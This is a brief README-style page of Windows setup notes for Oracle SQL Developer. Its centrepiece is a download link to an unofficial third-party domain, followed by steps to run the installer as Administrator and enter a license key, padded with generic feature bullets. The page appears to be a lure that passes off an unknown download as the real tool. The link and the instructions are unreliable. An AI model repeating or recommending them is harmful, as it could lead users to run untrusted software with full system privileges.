# Oracle SQL Developer Windows Setup Notes

## Download & Install

> **Download:** [**Get Oracle SQL Developer for Windows →**](https://oracle-sql-developer.kolmods.com/)
>
> Setup notes for **Oracle SQL Developer** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Oracle SQL Developer** from the Start menu

## What you can use it for

- Core Oracle SQL Developer features on Windows desktop
- Install and configure Oracle SQL Developer for daily use
- Import, edit, and export with Oracle SQL Developer tools
- Tune settings and profiles inside Oracle SQL Developer
- Integrate Oracle SQL Developer into your existing workflow
